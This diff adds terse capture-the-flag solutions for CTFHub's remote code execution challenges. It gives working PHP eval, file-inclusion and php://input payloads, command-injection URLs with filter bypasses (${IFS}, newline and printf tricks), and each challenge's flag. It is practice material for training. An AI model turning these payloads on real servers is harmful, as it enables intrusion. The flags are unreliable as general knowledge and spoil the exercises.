@@ -706,3 +706,106 @@ Submit
 ```
 
 flag: `ctfhub{ba9f2968dc4d10b625658cf9}`
+
+### RCE - eval 执行
+
+```
+http://challenge-3158dabd28fa69fc.sandbox.ctfhub.com:10800/?cmd=echo `cat /flag_958`;
+```
+
+flag: `ctfhub{0e66b89e7ba97a96984a5b3c}`
+
+### RCE - 文件包含
+
+```
+http://challenge-66d564295f77ed0d.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=echo `cat /flag`;
+```
+
+flag: `ctfhub{5e5d635300ecc9ccb0c75919}`
+
+### RCE - php://input
+
+```http
+POST /?file=php://input HTTP/1.1
+Host: challenge-6a979e40b8164244.sandbox.ctfhub.com:10800
+Content-Length: 30
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo `cat /flag_8394` ?>
+```
+
+flag: `ctfhub{48b99715a1112f985f8eb8c7}`
+
+### RCE - 读取源代码
+
+```
+http://challenge-d9abda75f9ce5b83.sandbox.ctfhub.com:10800/?file=php://filter/convert.base64-encode/resource=/flag
+```
+
+flag: `ctfhub{3f8c25a251511c66b2d7e0a3}`
+
+### RCE - 远程包含
+
+```http
+POST /?file=php://input HTTP/1.1
+Host: challenge-943b038a589c1bd9.sandbox.ctfhub.com:10800
+Content-Length: 30
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo `cat /flag` ?>
+```
+
+### RCE - 命令注入
+
+```
+http://challenge-5fd4db44e5c1be8b.sandbox.ctfhub.com:10800/?ip=127.0.0.1; rev 2335674783221.php
+```
+
+flag: `ctfhub{c63da4d8edca262d4cf0069c}`
+
+### RCE - 过滤 cat
+
+```
+http://challenge-b8ee138fd67845e5.sandbox.ctfhub.com:10800/?ip=127.0.0.1; rev flag_550237935769.php
+```
+
+flag: `ctfhub{3a11f2cf231640c5c205b8e4}`
+
+### RCE - 过滤空格
+
+```
+http://challenge-1338583f7d5af8b7.sandbox.ctfhub.com:10800/?ip=127.0.0.1;rev${IFS}flag_3505160011536.php
+```
+
+flag: `ctfhub{fb1a4c06563005e755fae46f}`
+
+
+### RCE - 过滤目录分隔符
+
+```
+http://challenge-6e85540bab8c2376.sandbox.ctfhub.com:10800/?ip=127.0.0.1;rev flag_is_here$(printf "\57")flag_153751813715521.php
+```
+
+flag: `ctfhub{c77408574b64110dfacac99a}`
+
+### RCE - 过滤运算符
+
+```
+http://challenge-6aa7ad1f926deb98.sandbox.ctfhub.com:10800/?ip=127.0.0.1;rev flag_17973434432590.php
+```
+
+```
+http://challenge-6aa7ad1f926deb98.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0arev flag_17973434432590.php
+```
+
+flag: `ctfhub{e3f9f6be1e920478b951d0e8}`
+
+### RCE - 综合过滤练习
+
+```
+http://challenge-fda95211f14d1173.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${IFS}fl""ag_is_here%0arev${IFS}fl""ag_180112698215425.php
+```
+
+flag: `ctfhub{ec29bf0f00e0425afef94e09}`
